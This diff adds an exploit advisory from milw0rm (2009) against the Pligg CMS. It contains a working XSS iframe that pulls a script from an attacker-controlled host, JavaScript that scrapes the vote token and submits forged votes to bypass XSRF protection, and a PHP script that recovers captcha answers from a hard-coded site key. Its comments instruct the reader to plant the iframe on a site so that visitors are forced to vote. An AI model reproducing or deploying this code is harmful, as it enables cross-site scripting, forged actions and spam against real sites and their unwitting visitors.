@@ -1,0 +1,84 @@
+Written By Michael Brooks
+Special thanks to str0ke!
+
+Pligg - XSRF Protection Bypass and Captcha Bypass
+affects 9.9.5
+
+XSRF Protection Bypass
+<html>
+<!--
+Remove this iframe from this file and place it on a site that you want
+to force people to vote for.
+Change these pligg_story_to_vote_for, target_pligg_site and site_you_control .
+-->
+<iframe src='http://target_pligg_site/index.php?category="><script
+src=http://site_you_control/pligg_auto_voter.html
+type=text/javascript></script>' width="0%" height="0%"></iframe>
+</html>
+
+	var pligg_story_to_vote_for="/story.php?title=pligg_xss";
+	
+	function r(){
+		var Z=false;
+		if(window.XMLHttpRequest){
+			try{
+				Z=new XMLHttpRequest()
+			}catch(e){Z=false}
+		}else if(window.ActiveXObject){
+			try{
+				Z=new ActiveXObject('Msxml2.XMLHTTP')
+			}catch(e){
+				try{
+					Z=new ActiveXObject('Microsoft.XMLHTTP')
+				}catch(e){Z=false}
+			}
+		}
+		return Z
+	}
+	var x=r();
+	x.open("GET",pligg_story_to_vote_for,true);
+	x.onreadystatechange = function() {
+		if (x.readyState == 4) {
+			var v=x.responseText.split("javascript:vote(");
+			v=v[1].split(")");
+			v=v[0].split(",");
+			var p="id="+v[1]+"&user="+v[0]+"&md5="+v[3].substring(1,33)+"&value="+v[4];
+			var y=r();
+			y.open("POST","/vote.php",true);
+			y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			y.setRequestHeader("Content-length", p.length);
+			y.setRequestHeader("Connection", "close");
+			y.send(p);
+		}
+	}
+	x.send('');
+
+Captcha bypass.
+The link to the capthca image will look something like this:
+
+http://127.0.0.1/Pligg_Beta_9.9.0/ts_image.php?ts_random=54771854
+
+To obtain the clear text, send that ts_random value to the
+captcha_bypass.php with the same web browser:
+
+
+http://127.0.0.1/captcha_bypass.php?ts_random=54771854
+
+captcha_bypass.php:
+
+<?php
+
+$sitekey=82397834;
+
+$ts_random=$_REQUEST['ts_random'];
+
+$datekey = date("F j");
+
+$rcode = hexdec(md5($_SERVER['HTTP_USER_AGENT'] . $sitekey .
+$ts_random . $datekey));
+
+print substr($rcode, 2, 6);
+
+?>
+
+# milw0rm.com [2009-01-29]
